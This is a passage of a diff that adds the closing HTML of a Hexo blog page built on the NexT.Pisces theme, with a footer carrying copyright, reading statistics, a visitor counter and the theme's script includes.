+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2020 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">atsud0</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">Symbols count total: </span>
+    <span title="Symbols count total">407k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">Reading time total &asymp;</span>
+    <span title="Reading time total">6:10</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
